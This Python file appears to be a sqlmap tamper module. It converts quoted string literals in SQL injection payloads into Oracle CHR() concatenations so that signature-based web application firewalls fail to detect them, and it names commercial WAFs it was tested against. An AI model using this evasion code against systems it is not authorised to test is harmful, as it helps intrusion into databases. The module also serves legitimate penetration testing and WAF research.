#!/usr/bin/env python

# Author: CyberVaca , Luis Vacas de Santos
# Twitter: https://twitter.com/CyberVaca_
# Based on Ghauri techniques - https://github.com/r0oth3x49/ghauri

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Converts string literals to CHR() concatenation for Oracle WAF bypass

    Requirement:
        * Oracle DBMS

    Tested against:
        * F5 BIG-IP ASM
        * Imperva SecureSphere
        * Signature-based WAFs

    Notes:
        * 'test' becomes CHR(116)||CHR(101)||CHR(115)||CHR(116)
        * Very effective against signature-based WAFs
        * Based on Ghauri's error-based Oracle technique

    Reference:
        * https://github.com/r0oth3x49/ghauri

    >>> tamper("SELECT 'DUAL' FROM DUAL")
    "SELECT CHR(68)||CHR(85)||CHR(65)||CHR(76) FROM DUAL"
    """
    if not payload:
        return payload

    retVal = payload

    def _string_to_chr(match):
        s = match.group(1)
        if not s:
            return "''"
        chr_parts = ['CHR(%d)' % ord(c) for c in s]
        return '||'.join(chr_parts)

    # Convert single-quoted strings to CHR() concatenation
    # Skip empty strings and common numeric-like strings
    retVal = re.sub(r"'([^']+)'", _string_to_chr, retVal)

    return retVal
